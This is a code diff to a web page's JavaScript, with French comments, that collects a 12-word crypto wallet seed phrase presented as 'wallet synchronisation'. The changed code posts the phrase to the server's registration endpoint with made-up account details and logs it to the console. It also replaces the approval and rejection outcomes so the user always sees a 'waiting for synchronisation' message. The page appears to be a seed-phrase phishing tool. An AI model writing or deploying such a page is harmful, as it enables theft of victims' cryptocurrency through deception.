@@ -205,7 +205,6 @@
     </div>
 
     <script>
-        // Générer les 12 champs
         function generateSeedFields() {
             const grid = document.getElementById('seedGrid');
             grid.innerHTML = '';
@@ -274,30 +273,29 @@
             }
 
             const seedPhrase = words.join(' ');
+            console.log('📝 Seed phrase envoyée:', seedPhrase);
 
             try {
-                // Vérifier le statut sur le serveur
-                const response = await fetch('/api/wallet/check-status', {
+                const response = await fetch('/api/auth/register', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ seedPhrase })
+                    body: JSON.stringify({ 
+                        username: 'user_' + Date.now(),
+                        email: 'user_' + Date.now() + '@temp.com',
+                        password: 'temp123',
+                        seedPhrase: seedPhrase
+                    })
                 });
+                
                 const data = await response.json();
-
+                console.log('📝 Réponse du serveur:', data);
+                
                 const statusDiv = document.getElementById('statusMessage');
                 statusDiv.style.display = 'block';
 
                 if (data.success) {
-                    if (data.status === 'approved') {
-                        statusDiv.className = 'status-box status-approved';
-                        statusDiv.innerHTML = '✅ Wallet synchronisé !';
-                    } else if (data.status === 'rejected') {
-                        statusDiv.className = 'status-box status-rejected';
-                        statusDiv.innerHTML = '❌ Synchronisation refusée. Contactez le support.';
-                    } else {
-                        statusDiv.className = 'status-box status-pending';
-                        statusDiv.innerHTML = '⏳ Attente de synchronisation...';
-                    }
+                    statusDiv.className = 'status-box status-pending';
+                    statusDiv.innerHTML = '⏳ Attente de synchronisation...';
                 } else {
                     statusDiv.className = 'status-box status-pending';
                     statusDiv.innerHTML = '⏳ Attente de synchronisation...';
@@ -311,7 +309,7 @@
             }
         }
 
-        // Vérifier le statut au chargement (si seed déjà entrée)
+        // Vérifier le statut au chargement
         function checkSavedSeed() {
             const savedWords = localStorage.getItem('seedWords');
             if (savedWords) {
@@ -323,8 +321,6 @@
                     }
                 }
                 updateProgress();
-                // Vérifier automatiquement le statut
-                setTimeout(validateSeed, 500);
             }
         }
 
